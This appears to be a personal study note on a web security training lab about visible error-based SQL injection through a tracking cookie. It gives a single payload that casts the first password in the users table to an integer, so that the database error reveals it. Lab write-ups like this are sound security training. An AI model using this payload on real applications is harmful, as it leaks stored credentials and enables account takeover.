
# Lab: Visible error-based SQL injection

PRACTITIONER

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account.



```java
'or 1 =cast((select password from users limit 1) as INT)-- -
```
![[class13.1.png]]![[class13.2.png]]

![[class13.3.png]]